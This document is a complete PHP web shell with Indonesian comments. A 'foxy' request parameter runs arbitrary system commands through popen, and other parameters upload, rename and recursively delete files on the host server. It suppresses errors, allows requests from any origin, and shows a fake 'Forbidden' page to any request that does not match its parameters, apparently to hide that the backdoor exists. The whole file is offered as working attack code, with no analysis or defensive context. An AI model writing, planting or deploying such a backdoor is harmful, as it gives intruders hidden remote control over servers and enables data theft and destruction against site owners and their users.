<?php
set_time_limit(0);
error_reporting(0);

// CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;

// Menentukan cwd (current working directory)
$default = __DIR__;
$cwd = $default;
if (isset($_REQUEST['cwd'])) {
    $requested = $_REQUEST['cwd'];
    if (is_dir($requested)) {
        $cwd = realpath($requested);
    }
}
chdir($cwd);

// Fungsi bantu: cetak output + cwd
function echo_with_cwd($out) {
    $path = getcwd();
    echo rtrim($out, "\r\n") . "\n\n" . $path;
    exit;
}

// FUNGSI REKURSIF UNTUK MENGHAPUS FOLDER BESERTA ISINYA
function rrmdir($path) {
    // Jika $path bukan folder, langsung unlink (file)
    if (!is_dir($path)) {
        return @unlink($path);
    }

    // $path adalah folder => hapus isinya, lalu rmdir
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $target = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($target)) {
            rrmdir($target); // rekursif
        } else {
            @unlink($target);
        }
    }
    return @rmdir($path);
}

// 1) SHELL COMMAND: ?foxy=...
if (isset($_GET['foxy'])) {
    $cmd = $_GET['foxy'];

    // Tangani cd ...
    if (preg_match('/^\s*cd\s+(.+)$/', $cmd, $m)) {
        $target = $m[1];
        if ($target[0] !== '/') {
            $target = $cwd . DIRECTORY_SEPARATOR . $target;
        }
        if (is_dir($target)) {
            chdir($target);
            echo_with_cwd('');
        } else {
            echo_with_cwd("cd: no such directory: {$m[1]}");
        }
    }

    // Jalankan command pakai popen
    $descriptors = @popen($cmd . ' 2>&1', 'r');
    if (!$descriptors) {
        echo_with_cwd("[!] popen failed");
    }
    $out = '';
    while (!feof($descriptors)) {
        $out .= fgets($descriptors);
    }
    pclose($descriptors);
    echo_with_cwd($out);
}

// 2) UPLOAD: POST "file"
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $target   = $cwd . DIRECTORY_SEPARATOR . $filename;
    header('Content-Type: text/plain; charset=UTF-8');
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "Uploaded to: {$target}";
    } else {
        http_response_code(500);
        echo "Upload failed";
    }
    exit;
}

// 3) RENAME: ?old=xxx&new=yyy
if (isset($_REQUEST['old'], $_REQUEST['new'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $old = $cwd . DIRECTORY_SEPARATOR . $_REQUEST['old'];
    $new = $cwd . DIRECTORY_SEPARATOR . $_REQUEST['new'];
    if (@rename($old, $new)) {
        echo "Renamed '{$_REQUEST['old']}' → '{$_REQUEST['new']}'";
    } else {
        http_response_code(500);
        echo "Rename failed";
    }
    exit;
}

// 4) DELETE: ?file=xxx
if (isset($_REQUEST['file'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $f = $cwd . DIRECTORY_SEPARATOR . $_REQUEST['file'];

    // Ganti unlink -> rrmdir => hapus file atau folder (rekursif)
    if (rrmdir($f)) {
        echo "Deleted '{$_REQUEST['file']}'";
    } else {
        http_response_code(500);
        echo "Delete failed";
    }
    exit;
}

// Jika tak ada param yang cocok => 403
http_response_code(403);
header('Content-Type: text/html; charset=UTF-8');
echo '<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>403 Forbidden</title>
<style>::selection{color:orange;}</style>
</head><body>
<h1>404 Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
</body></html>';
